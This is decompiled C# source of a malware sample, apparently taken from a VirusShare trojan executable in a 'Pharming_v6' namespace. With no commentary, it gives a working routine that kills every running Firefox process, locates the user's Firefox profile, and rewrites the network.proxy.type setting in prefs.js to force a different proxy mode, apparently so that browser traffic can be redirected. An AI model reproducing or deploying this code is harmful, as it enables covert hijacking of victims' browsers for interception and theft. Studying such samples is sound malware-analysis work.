// Decompiled with JetBrains decompiler
// Type: Pharming_v6.firefox
// Assembly: Pendencias, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CE3A4980-9956-4DF5-AF70-AAA224EEF3A0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Ransom.Win32.Cidox.mqr-9883cba8c0f6b9fcecde41989117c851ae6752e3444b152542eda9148fd906e8.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;

namespace Pharming_v6
{
  [StandardModule]
  internal sealed class firefox
  {
    public static void firefox()
    {
      Process[] processesByName = Process.GetProcessesByName(nameof (firefox));
      int index1 = 0;
      while (index1 < processesByName.Length)
      {
        processesByName[index1].Kill();
        checked { ++index1; }
      }
      string str1 = "";
      try
      {
        string[] directories = Directory.GetDirectories(Module1.appdata + "\\Mozilla\\Firefox\\Profiles\\");
        int index2 = 0;
        while (index2 < directories.Length)
        {
          str1 = directories[index2];
          checked { ++index2; }
        }
        if (File.Exists(str1 + "\\prefs.js"))
        {
          StreamReader streamReader = new StreamReader(str1 + "\\prefs.js");
          string end = streamReader.ReadToEnd();
          streamReader.Close();
          string path = str1 + "\\1024.js";
          string str2 = "user_pref(";
          string str3 = "network.proxy.type";
          string str4 = ", 1);";
          string str5 = ", 5);";
          string str6 = ", 2);";
          string str7 = ", 3);";
          string str8 = ", 4);";
          string oldValue1 = str2 + "\"" + str3 + "\"" + str4;
          string str9 = str2 + "\"" + str3 + "\"" + str5;
          string oldValue2 = str2 + "\"" + str3 + "\"" + str6;
          string oldValue3 = str2 + "\"" + str3 + "\"" + str7;
          string oldValue4 = str2 + "\"" + str3 + "\"" + str8;
          if (end.Contains(str2 + "\"" + str3 + "\"" + str4))
          {
            StreamWriter streamWriter = new StreamWriter(path, false);
            streamWriter.WriteLine(end.Replace(oldValue1, str9));
            streamWriter.Close();
          }
          else if (end.Contains(str2 + "\"" + str3 + "\"" + str6))
          {
            StreamWriter streamWriter = new StreamWriter(path, false);
            streamWriter.WriteLine(end.Replace(oldValue2, str9));
            streamWriter.Close();
          }
          else if (end.Contains(str2 + "\"" + str3 + "\"" + str7))
          {
            StreamWriter streamWriter = new StreamWriter(path, false);
            streamWriter.WriteLine(end.Replace(oldValue3, str9));
            streamWriter.Close();
          }
          else if (end.Contains(str2 + "\"" + str3 + "\"" + str8))
          {
            StreamWriter streamWriter = new StreamWriter(path, false);
            streamWriter.WriteLine(end.Replace(oldValue4, str9));
            streamWriter.Close();
          }
          else if (end.Contains(str2 + "\"" + str3 + "\"" + str5))
          {
            StreamWriter streamWriter = new StreamWriter(path, false);
            streamWriter.WriteLine(end.Replace(str9, str9));
            streamWriter.Close();
          }
          else
          {
            StreamWriter streamWriter = new StreamWriter(path, false);
            streamWriter.WriteLine(str9);
            streamWriter.Close();
          }
          File.Delete(str1 + "\\prefs.js");
          File.Move(str1 + "\\1024.js", str1 + "\\prefs.js");
        }
        else
          Console.WriteLine("B");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
